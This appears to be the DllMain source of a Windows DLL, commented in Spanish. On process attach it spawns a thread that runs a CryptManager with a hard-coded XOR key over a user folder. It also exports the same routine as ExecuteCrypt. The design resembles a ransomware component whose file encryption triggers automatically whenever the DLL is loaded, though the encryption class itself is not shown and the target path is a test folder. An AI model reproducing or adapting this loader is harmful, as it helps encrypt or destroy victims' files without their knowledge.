// dllmain.cpp : Define el punto de entrada de la aplicación DLL.
#include "pch.h"
#include <windows.h>
#include "CryptManager.h"

// Función que será llamada externamente
extern "C" __declspec(dllexport) void ExecuteCrypt() {
    CryptManager cryptManager(0xDE); // Clave XOR fija
    cryptManager.start(L"C:\\Users\\cain\\testing"); // Ruta de prueba
}

// Thread que ejecutará la lógica principal
DWORD WINAPI CryptThread(LPVOID lpParam) {
    // Ejecutar la función principal
    ExecuteCrypt();
    return 0;
}

// DllMain gestiona los eventos de carga
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){
    HANDLE hThread = NULL;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Optimización: deshabilitar notificaciones de threads
        DisableThreadLibraryCalls(hModule);

        // Crear thread para ejecutar la lógica (evita loader lock)
        hThread = CreateThread(NULL, 0, CryptThread, NULL, 0, NULL);

        if (hThread) {
            // No necesitamos mantener el handle abierto
            CloseHandle(hThread);
        }
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}